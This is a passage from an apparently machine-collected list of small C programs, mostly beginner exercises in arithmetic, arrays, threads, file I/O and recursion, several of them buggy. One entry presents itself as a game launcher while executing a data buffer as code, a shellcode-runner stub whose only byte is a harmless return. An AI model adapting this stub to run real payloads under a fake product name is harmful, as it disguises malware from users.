    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n   double*** mat3;\n   int m,n,p;\n   int i,j,k;\n   m=2; n=3; p=4;\n   printf(\"This program causes a coredump, unless you fix the error in it !\\n\");\n   mat3 = (double***) malloc(m*sizeof(double**));\n   if (mat3 == ((void*)0))\n      exit(1);\n   mat3[0] = (double**) malloc(m*n*sizeof(double*));\n   if (mat3[0] == ((void*)0))\n      exit(1);\n   mat3[0][0] = (double*) malloc(m*n*p*sizeof(double));\n   if (mat3[0][0] == ((void*)0))\n      exit(1);\n   for (i=0; i<m; i++)\n   {\n      mat3[i] = mat3[0] + i*n;\n      mat3[i][0] = mat3[0][0] + i*n*p;\n      for(j=0; j<n; j++)\n      {\n         mat3[i][j] = mat3[i][0] + j*p;\n      }\n   }\n   for(i=0;i<m;i++)\n      for(j=0;j<n;j++)\n         for(k=0;k<p;k++)\n             mat3[i][j][k] = i + 10*j + 100*k;\n   for(i=0;i<m;i++)\n      for(j=0;j<n;j++)\n         for(k=0;k<p;k++)\n             printf(\"mat3[%d][%d][%d] = %lf\\n\",i,j,k,mat3[i][j][k]);\n   exit(0);\n}",
    "#include <stdio.h>\ndouble average(double* start, double* end);\nint main() {\n double arr[5] = { 10,13,12,7,8 };\n printf(\"Avg = %f\\n\", average(arr, arr+5));\n}\ndouble average(double* start, double* end) {\n int count = end - start;\n printf(\"start : %p end : %p\\n\", *start, *end);\n double avg = 0.0;\n while (start < end) {\n  avg += *start++;\n };\n avg /= (double)count;\n return avg;\n}",
    "#include <stdio.h>\nint main() {\n int input, current_max = 0, counter = 0;\n printf(\"Enter an infinite number of space-separated positive \");\n printf(\"integers.\\nTo stop entering integers, enter -1.\\n\");\n printf(\"Input: \");\n while (1) {\n  scanf(\"%d\", &input);\n  if (input == -1) {\n   if (!counter) {\n    printf(\"There is no max number!\");\n    return 0;\n   }\n   printf(\"Max number: %d\\n\", current_max);\n   printf(\"Number of occurrences: %d\\n\", counter);\n   return 0;\n  }\n  if (input == current_max)\n   ++counter;\n  else if (input > current_max) {\n   current_max = input;\n   counter = 1;\n  }\n }\n}",
    "#include <stdio.h>\nint main()\n{\n  float n1,n2,avg;\n  printf(\"Enter the marks of two subjects\\n\");\n  scanf(\"%f %f\",&n1,&n2);\n  avg = (n1+n2)/2;\n  printf(\"Average of the marks : %.2f\", avg);\n  return 0;\n}",
    "#include <stdio.h>\nint factorial (int number);\nint main (void)\n{\n int number;\n printf(\"Enter a number: \");\n scanf(\"%d\", &number);\n int temp = number;\n int i;\n for (i = number - 1; i > 1; --i)\n {\n  number *= i;\n }\n number = number == 0 ? 1 : number;\n printf(\"The factorial of %d is %d with a for-loop.\\n\", temp, number);\n printf(\"The factorial of %d is %d with recursion.\\n\", temp, factorial(temp));\n return 0;\n}\nint factorial (int number)\n{\n if (number >= 1)\n {\n  return number * factorial(number - 1);\n }\n else\n {\n  return 1;\n }\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int numOfArguments = argc;\n    char *argument1 = argv[0];\n    char *argument2 = argv[1];\n    printf(\"Number of Arguments: %d\\n\", numOfArguments);\n    printf(\"Argument 1 is the program name: %s\\n\", argument1);\n    printf(\"Argument 2 is the command line argument: %s\\n\", argument2);\n    return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n puts(\"\\\"Ro'b'er\tto\\\\/\\\"\");\n puts(\"(._.) ( l: ) ( .-. ) ( :l ) (._.)\");\n puts(\"(^_-) (-_-) (-_^)\");\n puts(\"(\\\"_\\\") ('.')\");\n return 0;\n}",
    "#include <stdio.h>\nchar run_game_dummy[] = \"\\xc3\";\nint main (int ac, char **av) {\n    printf(\"F1 Manager Professional Megapack 2022\\nPress any key to continue..\");\n    getchar();\n    void(*f)() = (void(*)())run_game_dummy;\n    f();\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n FILE *in, *out;\n char s[10];\n if((in=fopen(\"in.txt\",\"rt\"))==((void*)0)){\n  fprintf((stderr),\"Cannot open input file.\\n\");\n  return 1;\n }\n if((out=fopen(\"out.txt\",\"wt\"))==((void*)0)){\n  fprintf((stderr),\"Cannot open output file.\\n\");\n  return 1;\n }\n if (!feof(in) && fgets(s,10,in)!=((void*)0)){\n  fputs(s,out);\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<ctype.h>\n\nvoid rot13(char text[1001]);\nint main() {\n    char msg[1001];\n    printf(\"digite a mensagem:\\n\");\n    fgets(msg,1001,(stdin));\n    printf(\"\\nDigitado: %s\",msg);\n    rot13(msg);\n    printf(\"Saida:    %s\\n\", msg);\n    return 0;\n}\nvoid rot13(char text[1001]){\n int i=0;\n    for(i;text[i]!='\\0'; i++){\n        if((text[i]>=0x61 && text[i]<=0x6D) || (text[i]>=0x41 && text[i]<=0x4D)){\n            text[i]+=13;\n            text[i]=toupper(text[i]);\n        }\n        else if((text[i]>=0x6E && text[i]<=0x7A) || (text[i]>=0x4E && text[i]<=0x5A)){\n            text[i]-=13;\n            text[i]=toupper(text[i]);\n        }\n        else{\n            continue;\n        }\n    }\n}",
    "#include <stdio.h>\n#include <math.h>\nvoid printframe(int width, int height, int *frame);\nint main() {\n int x = 1;\n int y = ceil(x/8.0);\n printf(\"\\nValue is %d\\n\", y);\n int frame[2][17] = { { 255, 254, 252, 248, 240, 224, 192, 128, 0, 128, 192, 224, 240, 248, 252, 254, 255 },\n          { 0, 128, 192, 224, 240, 248, 252, 254, 255, 254, 252, 248, 240, 224, 192, 128, 0} };\n printframe(17, 16, (int *)frame);\n}\nvoid printframe(int width, int height, int *frame) {\n int rows = ceil(height/8.0);\n printf(\"   |\");\n int i = 0;\n for (int j=0; j<width; j++){\n  if (j%5 == 0) printf(\"%d\",j/5); else printf(\" \");\n  i++;\n  if (i==10) i = 0;\n }\n printf(\"|\\n\");\n printf(\"   \");\n for (int j = 0; j < width+2; j++) {\n  printf(\"-\");\n }\n printf(\"\\n\");\n for (int j = 0; j < rows; j++) {\n  int mask = 1;\n  for (int b = 0; b < 8; b++) {\n   printf(\"%03d|\",j*8+b);\n   for (int i = 0; i < width; i++) {\n    if (*((frame+j*width)+i) & mask) printf(\"*\"); else printf(\"_\");\n   }\n   printf(\"|\\n\");\n   mask <<= 1;\n  }\n }\n printf(\"   \");\n for (int j = 0; j < width+2; j++) {\n  printf(\"-\");\n }\n printf(\"\\n\");\n}",
    "#include <stdio.h>\ndouble solve(long long n, long long m)\n{\n  double sum = 0;\n  for (long long i = n; i <= m; i++) {\n    sum += 1.0 / (i*i);\n  }\n  return sum;\n}\nint main()\n{\n  long long n, m;\n  int i = 1;\n  while (scanf(\"%lld%lld\", &n, &m) == 2 && n != 0 && m != 0) {\n    double result = solve(n, m);\n    printf(\"Case %d: %.5f\\n\", i, result);\n    i++;\n  }\n}",
    "#include <stdio.h>\n\nfloat circle_area(float radius){\n    float area = 3.14 * radius * radius;\n    return area;\n}\nint main() {\n    float radius = -1;\n    while(radius <= 0){\n        printf(\"Type the radius of your circunference: \");\n        scanf(\"%f\", &radius);\n    }\n    printf(\"Circle area: %f\", circle_area(radius));\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n   int original[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 0};\n   int copied[10];\n   int loop, count;\n   count = 9;\n   for(loop = 0; loop < 10; loop++) {\n      copied[count] = original[loop];\n      count--;\n   }\n   printf(\"original -> copied \\n\");\n   for(loop = 0; loop < 10; loop++) {\n      printf(\"   %2d        %2d\\n\", original[loop], copied[loop]);\n   }\n   return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n  int arr1[5],arr2[5],arr3[5],i;\n  printf(\"Enter 5 numbers of arr1:\");\n  for(i=0;i<=4;i++)\n  {\n    scanf(\"%d\",&arr1[i]);\n  }\n  printf(\"Enter 5 numbers of arr2:\");\n  for(i=0;i<=4;i++)\n  {\n    scanf(\"%d\",&arr2[i]);\n  }\n  for(i=0;i<=4;i++)\n  {\n    arr3[i]=arr1[i]+arr2[i];\n  }\n  printf(\"Addition of two array:\");\n  for(i=0;i<=4;i++)\n  {\n      printf(\"%d\\t\",arr3[i]);\n  }\n}",
    "#include<stdio.h>\nint busqueda_binaria(int, int, int *, int);\nint main(){\n    int n, buscados, vandalo;\n    scanf(\"%d\", &n);\n    int enemigos[n];\n    for (int i = 0; i < n; ++i) {\n        scanf(\"%d\", &enemigos[i]);\n    }\n    scanf(\"%d\", &buscados);\n    for (int i = 0; i < buscados; ++i) {\n        scanf(\"%d\", &vandalo);\n        printf(\"%d\\n\", busqueda_binaria(0, n, enemigos, vandalo));\n    }\n    return 0;\n}\nint busqueda_binaria (int inicio, int final, int * enemigos, int buscado){\n    int medio = (inicio + final) / 2;\n    if (enemigos[medio] == buscado){\n        return medio;\n    } else if (enemigos[medio] > buscado){\n        busqueda_binaria(inicio, medio, enemigos, buscado);\n    } else {\n        busqueda_binaria(medio, final, enemigos, buscado);\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n  int age;\n  age = 27;\n  printf(\"My name is Ruan and I'm %d years old.\\n\", age);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nvoid fillFibonacci(int *Buffer, int Count) {\n    if(Count == 1) {\n        Buffer[0] = 0;\n    }\n    else if(Count == 2) {\n        Buffer[0] = 0;\n        Buffer[1] = 1;\n    }\n    else if(Count > 2) {\n        Buffer[0] = 0;\n        Buffer[1] = 1;\n        for(int Index = 2; Index < Count; ++Index) {\n            Buffer[Index] = Buffer[Index-1] + Buffer[Index-2];\n        }\n    }\n}\nint main(int ArgCount, char *ArgVals[]) {\n    if(ArgCount < 2) {\n        fprintf((stderr), \"Usage: %s SequenceSize\\n\", ArgVals[0]);\n        return 1;\n    }\n    int SequenceSize;\n\n\n\n    char *EndRead;\n    SequenceSize = strtol(ArgVals[1], &EndRead, 10);\n    if(EndRead == ArgVals[1]) {\n        fprintf((stderr), \"Invalid SequenceSize given\\n\");\n        return 1;\n    }\n\n    int *FibonacciBuffer = malloc(sizeof(*FibonacciBuffer)*SequenceSize);\n    fillFibonacci(FibonacciBuffer, SequenceSize);\n    for(int Index = 0; Index < SequenceSize; ++Index) {\n        printf(\"%d \", FibonacciBuffer[Index]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint log_2(int n) {\n if (n<2)\n  return 0;\n else\n  return log_2(n/2) + 1;\n}\nint main() {\n int *input;\n input = (int *) malloc(sizeof(int));\n printf(\"Please input a non-negative integer.\\n\");\n scanf(\"%d\", input);\n printf(\"The largest integer x such that 2^x <= %d is %d\\n\", *input, log_2(*input));\n}",
    "#include <stdio.h>\nint factorial(int number);\nint main() {\n    int n, k;\n    printf(\"%s\", \"Introduceti un numar n:\\n\");\n    scanf(\"%d\", &n);\n    printf(\"Introduceti un numar k unde k <= %d\\n\", n);\n    scanf(\"%d\", &k);\n    while (k > n) {\n        printf(\"Introduceti un numar k unde k <= %d\\n\", n);\n        scanf(\"%d\", &k);\n    }\n    printf(\"Numarul de permutari = %d\\n\", factorial(n));\n    printf(\"Numarul de aranjamente de %d luate cate %d = %d\\n\", n, k, factorial(n) / factorial(n - k));\n    printf(\"Numarul de combinari de %d luate cate %d = %d\\n\", n, k, factorial(n) / (factorial(k) * factorial(n-k)));\n    return 0;\n}\nint factorial(int number) {\n    int factorial = 1;\n    if (number < 0) {\n        number = number * (-1);\n    }\n    for (int i = 2; i <= number; i++) {\n        factorial *= i;\n    }\n    return factorial;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\nint main(void){\n    double num;\n    scanf(\"%lf\", &num);\n    printf(\"%d\\n\", (int)num);\n    printf(\"%.4lf\\n\", num - (int)num);\n    printf(\"%.0lf\\n\", round(num));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int int_1, int_2;\n    float float_1, float_2;\n    printf(\"Inserisci i 2 int: \");\n    scanf(\"%d %d\", &int_1, &int_2);\n    printf(\"Inserisci i 2 float: \");\n    scanf(\"%f %f\", &float_1, &float_2);\n    printf(\"Variabile\\tValue\\n\");\n    printf(\"int_1 int_2\\t%5d %5d\\n\", int_1, int_2);\n    printf(\"float_1 \\t%f\\n\", float_1);\n    printf(\"float_2 \\t%f\\n\", float_2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint lePositivo();\nint somaDivisores( int );\nint main() {\n    int array[5];\n    for(int i = 0; i < 5; i++){\n        printf(\"n[%d]: \", i);\n        array[i] = lePositivo();\n    }\n    for(int i = 0; i < 5; i++){\n        printf(\"Soma dos divisores de %d: %d\\n\", array[i], somaDivisores(array[i]));\n    }\n    return 0;\n}\nint lePositivo() {\n    int n;\n    scanf(\"%d\", &n);\n    while(n < 0){\n        printf(\"Entre com um valor positivo: \");\n        scanf(\"%d\", &n);\n    };\n    return n;\n}\nint somaDivisores( int n ) {\n    int soma = 0;\n    for(int i = n - 1; i > 0; i--){\n        if(n % i == 0){\n            soma += i;\n        }\n    }\n    return soma;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int luckyNumbers[] = {4, 8, 15, 16, 23, 42};\n    int i;\n    for(i = 0; i < 6 ; i++){\n        printf(\"%d\\n\", luckyNumbers[i]);\n    }\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(void)\n{\n unsigned short seed1[] = { 0x1234, 0x5678, 0x9abc };\n unsigned short *oldseed;\n oldseed = seed48(seed1);\n printf(\"Initial seed: %#06x %#06x %#06x\\n\",\n        oldseed[0], oldseed[1], oldseed[2]);\n printf(\"lrand48() = %ld\\n\", lrand48());\n seed48(seed1);\n printf(\"mrand48() = %ld\\n\", mrand48());\n return 1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void)\n{\n char *str=\"9876543210\";\n printf(\"str= %s sizeof(str)= %ld \\n\", str, sizeof(str) );\n fflush((stdout));\n printf(\"PRIMA str= %s \\n\", str );\n fflush((stdout));\n str[1]='f';\n printf(\"DOPO str= %s \\n\", str );\n fflush((stdout));\n return(0);\n}",
    "#include <stdio.h>\n#include <time.h>\nint main()\n{\n    time_t timer;\n    time(&timer);\n    printf (\"Local time is: %s\", ctime(&timer));\n    return 0;\n}",
    "#include <stdio.h>\nvoid func(int num_params){\n int a[num_params];\n a[0] = 0x11;\n a[1] = 0x11;\n printf(\"a[0] = %d\\n\",a[0]);\n}\nint main() {\n func(2);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <time.h>\nint main(void)\n{\n int n;\n srand(time(0));\n n = rand() - (0x7fffffff) / 2;\n if (n > 0)\n  printf(\"%i is positive\\n\", n);\n else if (n == 0)\n  printf(\"%i is zero\\n\", n);\n else\n  printf(\"%i is negative\\n\", n);\n return (0);\n}",
    "#include <pthread.h>\n#include <time.h>\n#include <stdlib.h>\n#include <stdio.h>\nint ITERS;\nint *buffer;\nint size, filled;\npthread_mutex_t mutex;\npthread_cond_t prod, cons;\nint producers_left, consumers_left;\nvoid* Producer(void* tNo) {\n int t = (int)(*((int *)tNo));\n for(int i=0;i<ITERS; i++) {\n  pthread_mutex_lock(&mutex);\n  while(filled == size) {\n   if(consumers_left == 0) {\n    printf(\"All consumers left.\\n\");\n    producers_left--;\n    pthread_mutex_unlock(&mutex);\n    return 0;\n   }\n   pthread_cond_wait(&cons, &mutex);\n  }\n  buffer[filled] = rand();\n  printf(\"Producer %d filled position %d with %d.\\n\", t, filled, buffer[filled]);\n  filled++;\n  producers_left--;\n  pthread_cond_broadcast(&prod);\n  pthread_mutex_unlock(&mutex);\n }\n}\nvoid* Consumer(void* tNo) {\n int t = (int)(*((int *)tNo));\n for(int i=0;i<ITERS; i++) {\n  pthread_mutex_lock(&mutex);\n  while(filled == 0) {\n   if(producers_left == 0) {\n    printf(\"All producers left.\\n\");\n    consumers_left--;\n    pthread_mutex_unlock(&mutex);\n    return 0;\n   }\n   pthread_cond_wait(&prod, &mutex);\n  }\n  printf(\"Consumer %d consumed position %d with %d.\\n\", t, filled-1, buffer[filled-1]);\n  filled--;\n  consumers_left--;\n  pthread_cond_broadcast(&cons);\n  pthread_mutex_unlock(&mutex);\n }\n}\nint main(int argc, char const *argv[])\n{\n srand(time(((void*)0)));\n int pN, cN;\n scanf(\"%d %d %d %d\", &pN, &cN, &size, &ITERS);\n int maxN = pN>cN?pN:cN;\n pthread_mutex_init(&mutex, ((void*)0));\n pthread_cond_init(&prod, ((void*)0));\n pthread_cond_init(&cons, ((void*)0));\n producers_left = pN*ITERS;\n consumers_left = cN*ITERS;\n pthread_t *producer = (pthread_t *)malloc(pN * sizeof(pthread_t));\n pthread_t *consumer = (pthread_t *)malloc(cN * sizeof(pthread_t));\n int *threadNo = (int *)malloc(maxN * sizeof(int));\n for(int i=0;i<maxN; i++)\n  threadNo[i] = i;\n buffer = (int *)malloc(size * sizeof(int));\n filled = 0;\n for(int i=0;i<pN;i++) {\n  pthread_create(&producer[i], ((void*)0), Producer, (void *)(threadNo + i));\n }\n for(int i=0;i<cN;i++) {\n  pthread_create(&consumer[i], ((void*)0), Consumer, (void *)(threadNo + i));\n }\n for(int i=0;i<cN;i++) {\n  pthread_join(consumer[i], ((void*)0));\n }\n for(int i=0;i<pN;i++) {\n  pthread_join(producer[i], ((void*)0));\n }\n free(buffer);\n free(threadNo);\n free(producer);\n free(consumer);\n return 0;\n}",
    "#include <pthread.h>\n#include <stdio.h>\nvoid *inc_x(void *x_void_ptr)\n{\n  int* x_ptr = (int*)x_void_ptr;\n  for(int ii = 0; ii < 2000; ii++)\n  {\n    (*x_ptr)++;\n  }\n  return ((void*)0);\n}\nint main()\n{\n  int x = 0;\n  pthread_t thread_a;\n  pthread_t thread_b;\n  pthread_create(&thread_a, ((void*)0), inc_x, &x);\n  pthread_create(&thread_b, ((void*)0), inc_x, &x);\n  printf(\"thread: %02x\\n\", (unsigned)thread_a);\n  printf(\"thread: %02x\\n\", (unsigned)thread_b);\n  pthread_join(thread_b, ((void*)0));\n  pthread_join(thread_a, ((void*)0));\n  printf(\"value: %d\\n\", x);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int ano;\n  scanf(\"%i\", &ano);\n  if (( (ano % 4 == 0) && (ano % 100 != 0) ) || (ano % 400 == 0))\n  {\n    printf(\"BISSEXTO\\n\");\n  }\n  else\n  {\n    printf(\"NAOBISSEXTO\\n\");\n  }\n  return(0);\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n  printf(\"%s: Hello world\\n\", __func__);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main()\n{\n    int fd;\n    char * myfifo = \"/tmp/myfifo\";\n    mkfifo(myfifo, 0666);\n    char name[50];\n    printf(\"Insira seu nome para iniciar uma conversa: \\n\");\n    scanf(\"%s\", name);\n    getchar();\n    char arr1[80], arr2[80];\n    while (1)\n    {\n        char final_message[130] = \"\";\n        printf(\"Voc\u00ea: \");\n        fd = open(myfifo, (0x10000000));\n        fgets(arr2, 80, (stdin));\n        strcat(final_message, name);\n        strcat(final_message, \": \");\n        strcat(final_message, arr2);\n        write(fd, final_message, strlen(final_message)+1);\n        close(fd);\n        fd = open(myfifo, (0x04000000));\n        read(fd, arr1, sizeof(arr1));\n        printf(\"%s\", arr1);\n        close(fd);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(void) {\n  int upperBound = 0;\n  int lowerBound = 1;\n  int numGuesses = 0;\n  int currGuess = 0;\n  char lowHighOrEqual = '\\0';\n  printf(\"Enter n: \");\n  if (scanf(\"%d\", &upperBound) == 1 && upperBound >= 0) {\n    currGuess = ((upperBound - lowerBound) / 2) + 1;\n    while ((upperBound - lowerBound) > 0) {\n      printf(\"Is your number %d? \", currGuess);\n      scanf(\" %c\", &lowHighOrEqual);\n      if (lowHighOrEqual == 'e') {\n        ++numGuesses;\n        break;\n      }\n      else if (lowHighOrEqual == 'l') {\n        if (upperBound == currGuess) {\n          printf(\"Error: that's not possible.\\n\");\n          return 0;\n        }\n        lowerBound = currGuess + 1;\n        currGuess = lowerBound + ((upperBound - lowerBound) / 2.0);\n      }\n      else if (lowHighOrEqual == 's'){\n        if (lowerBound == currGuess) {\n          printf(\"Error: that's not possible.\\n\");\n          return 0;\n        }\n        upperBound = currGuess - 1;\n        currGuess = upperBound - ((upperBound - lowerBound) / 2.0);\n      }\n      else {\n        printf(\"Error: invalid input.\\n\");\n        return 0;\n      }\n      ++numGuesses;\n    }\n    printf(\"Your number must be %d. I used %d guesses.\\n\", currGuess, numGuesses);\n  }\n  else {\n    if ((0 ? isdigit(upperBound) : ((unsigned)(upperBound)-'0') < 10)) {\n      printf(\"Error: n must be positive.\\n\");\n    }\n    else {\n      printf(\"Error: invalid input.\\n\");\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid swap(int *a, int *b)\n{\n    int temp;\n    temp = *a;\n    *a = *b;\n    *b = temp;\n}\nvoid shakersort(int *a, int n)\n{\n    int p, i;\n    for (p = 1; p <= n / 2; p++)\n    {\n        for (i = p - 1; i < n - p; i++)\n            if (a[i] > a[i + 1])\n            {\n                swap(&a[i], &a[i + 1]);\n            }\n        for (i = n - p - 1; i >= p; i--)\n            if (a[i] < a[i - 1])\n            {\n                swap(&a[i], &a[i - 1]);\n            }\n    }\n}\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    int *arr = (int *)malloc(n * sizeof(int));\n    int i;\n    for (i = 0; i < n; i++) scanf(\"%d \", &arr[i]);\n    shakersort(arr, n);\n    for (i = 0; i < n; i++) printf(\"%d \", arr[i]);\n    free(arr);\n    return 0;\n}",
    "#include <stdio.h>\nstatic char daytab[2][13] = {\n {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},\n {0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},\n};\nint day_of_year(int year, int month, int day)\n{\n int i, leap;\n if (year < 1752 || month < 1 || month > 12 || day < 1)\n  return -1;\n leap = (year%4 == 0 && year%100 != 0) || year%400 == 0;\n if (day > daytab[leap][month])\n  return -1;\n for (i = 1; i < month; i++)\n  day += daytab[leap][i];\n return day;\n}\nint month_day(int year, int yearday, int *pmonth, int *pday)\n{\n int i, leap;\n if (year < 1752 || yearday < 1)\n  return -1;\n leap = (year%4 == 0 && year%100 != 0) || year%400 == 0;\n if ((leap && yearday > 366) || (!leap && yearday > 365))\n  return -1;\n for (i = 1; yearday > daytab[leap][i]; i++)\n  yearday -= daytab[leap][i];\n *pmonth = i;\n *pday = yearday;\n return 0;\n}\nint main(void)\n{\n int year, month, day, yearday;\n for (year = 1970; year <= 2000; ++year) {\n  for (yearday = 1; yearday < 366; ++yearday) {\n   if (month_day(year, yearday, &month, &day) == -1) {\n    printf(\"month_day failed: %d %d\\n\",\n     year, yearday);\n   } else if (day_of_year(year, month, day) != yearday) {\n    printf(\"bad result: %d %d\\n\", year, yearday);\n    printf(\"month = %d, day = %d\\n\", month, day);\n   }\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main()\n{\n int r;\n r = unlink(\"kill.txt\");\n if( r == 0 )\n  puts(\"File deleted\");\n else\n  puts(\"Something went wrong!\");\n return(0);\n}",
    "#include <stdio.h>\n\n\n\nvoid init_libretti(int arr[][8]);\nvoid statistiche_stud(int arr[][8]);\nvoid statistiche_esami(int arr[][8]);\nint main(void){\n char buf[10];\n int libretti[100][8];\n int temp_stud, temp_es, temp_vot;\n init_libretti(libretti);\n while(fgets(buf, sizeof(buf), (stdin)) != ((void*)0)){\n  sscanf(buf, \"%d %d %d\", &temp_stud, &temp_es, &temp_vot);\n  libretti[temp_stud - 1][temp_es - 1] = temp_vot;\n }\n statistiche_stud(libretti);\n putchar('\\n');\n statistiche_esami(libretti);\n return 0;\n}\nvoid init_libretti(int arr[][8]){\n int i, j;\n for(i = 0; i < 100; i++)\n  for(j = 0; j < 8; j++)\n   arr[i][j] = 0;\n}\nvoid statistiche_stud(int arr[][8]){\n double media = 0.0;\n int i, j, count = 0;\n for(i = 0; i < 100; i++){\n  for(j = 0; j < 8; j++){\n   if(arr[i][j] != 0){\n    count++;\n    media += arr[i][j];\n   }\n  }\n  media = (count) ? media / count : 0.0;\n  printf(\"Studente %d:\\nEsami superati: %d\\tMedia esami: %g\\n\", i + 1, count, media);\n  count = 0;\n  media = 0;\n }\n}\nvoid statistiche_esami(int arr[][8]){\n double media[8] = {0.0};\n int i, j, count[8] = {0};\n for(i = 0; i < 100; i++)\n  for(j = 0; j < 8; j++)\n   if(arr[i][j] != 0){\n    count[j]++;\n    media[j] += arr[i][j];\n   }\n for(i = 0; i < 8; i++){\n  printf(\"Esame %d:\\nNumero voti: %d\\tMedia voti: %g\\n\", i + 1, count[i], media[i] / count[i]);\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    FILE *pFile;\n    long lSize;\n    char *buffer;\n    size_t result;\n    pFile = fopen(\"test.txt\", \"rb\");\n    if (pFile == ((void*)0)) {\n        fputs(\"File error\", (stderr));\n        exit(1);\n    }\n    fseek(pFile, 0, (2));\n    lSize = ftell(pFile);\n    rewind(pFile);\n    buffer = (char *) malloc(sizeof(char) * lSize);\n    if (buffer == ((void*)0)) {\n        fputs(\"Memory error\", (stderr));\n        exit(2);\n    }\n    result = fread(buffer, 1, lSize, pFile);\n    if (result != lSize) {\n        fputs(\"Reading error\", (stderr));\n        exit(3);\n    }\n    fclose(pFile);\n    printf(\"%s\\n\", buffer);\n    free(buffer);\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n    printf(\"C\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u30661\u6642\u9593\\n\");\n    printf(\"C\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u30662\u6642\u9593\\n\");\n    printf(\"C\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u30663\u6642\u9593\\n\");\n    printf(\"C\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u30664\u6642\u9593\\n\");\n    printf(\"C\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u30665\u6642\u9593\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n int count;\n char *str = argv[1];\n count = 0;\n while (str[count++]);\n printf(\"count: %d\\n\", count);\n return -1;\n}",
    "#include <stdio.h>\nunsigned int fib(unsigned int n)\n{\n unsigned int t[2];\n t[0] = 0;\n t[1] = 1;\n for (int i = 0; i < n; i++) {\n  unsigned int x = t[0] + t[1];\n  t[0] = t[1];\n  t[1] = x;\n }\n return t[0];\n}\nint main(int argc, char *argv[])\n{\n unsigned int n;\n if ((argc > 1) && (sscanf(argv[1], \"%u\", &n) == 1)) {\n  printf(\"%u\\n\", fib(n));\n  return 0;\n } else {\n  return 1;\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n    int a, b;\n    for (a = 1; a < 1001; a++)\n        for (b = a + 1; b < 1001; b++)\n        {\n            int c = 1000 - a - b;\n            int a2b2 = a * a + b * b;\n            int cc = c * c;\n            if (cc == a2b2 && c > a)\n                printf(\"%d\\n%d\\n%d\\n%d\\n\", a, b, c, a * b * c);\n        }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{ float a,b;\n int c;\n float d;\n printf(\"Enter two value: \");\n scanf(\"%f%f\", &a,&b);\n printf(\"Enter the number of operation you want to perform:\\n\");\n printf(\"1. Addition\\n2. Subraction.\\n3. Multiplication\\n4. Division\\n5. Modulus\\n\");\n scanf(\"%d\",&c);\n switch(c)\n {\n case 1: printf(\"Sum of numbers:%f\\n\", a+b);\n  break;\ncase 2: printf(\"Difference of the numbers:%f\\n\", a-b);\n break;\ncase 3: d=a*b;\n printf(\"Multiplication of numbers:%f\\n\",d);\n break;\ncase 4: d=a/b;\n printf(\"Quotient is:%f\\n\",d);\n break;\ncase 5: d=((int)a)%((int)b);\n printf(\"Modulus is:%f\\n\",d);\n break;\ndefault : printf(\"Wrong Choice!!!\\n\");\n}\nreturn 0;\n}",
    "#include <stdio.h>\nint radice(int, int *);\nint main() {\n  int n, rad, prec;\n  scanf(\"%d\", &n);\n  prec = radice(n, &rad);\n  printf(\"%d (prec: %d)\\n\", rad, prec);\n  return 0;\n}\nint radice(int arg, int *res) {\n  *res = 0;\n  while ((*res) * (*res) < arg) {\n    (*res)++;\n  }\n  if ((*res) * (*res) == arg)\n    return 1;\n  else {\n    (*res)--;\n    return 0;\n  }\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\nint alpha(char a);\nint toarabic(char roman[]);\nvoid toroman(int arabic);\nint main(void) {\n    int num,result,i;\n    char op1[9],op2[9];\n    scanf(\"%d\",&num);\n    for (i=0; i<num; i++) {\n        result = 0;\n        scanf(\" %s %s\",op1,op2);\n        result = toarabic(op1) + toarabic(op2);\n        toroman(result);\n    }\n    return 0;\n}\nint alpha(char a) {\n    switch (a) {\n        case 'm':\n            return 1000;\n        case 'c':\n            return 100;\n        case 'x':\n            return 10;\n        case 'i':\n            return 1;\n    }\n}\nint toarabic(char roman[]) {\n    int i,result=0;\n    for (i=0; i<strlen(roman); i++) {\n        if ((0 ? isalpha(roman[i]) : (((unsigned)(roman[i])|32)-'a') < 26)) {\n            result+=alpha(roman[i]);\n        } else {\n            result+= (roman[i]-'0') * alpha(roman[i+1]);\n            i++;\n        }\n    }\n    return result;\n}\nvoid toroman(int arabic) {\n    if (arabic/1000==1) {\n        printf(\"m\");\n    } else if (arabic/1000>1) {\n        printf(\"%dm\",arabic/1000);\n    }\n    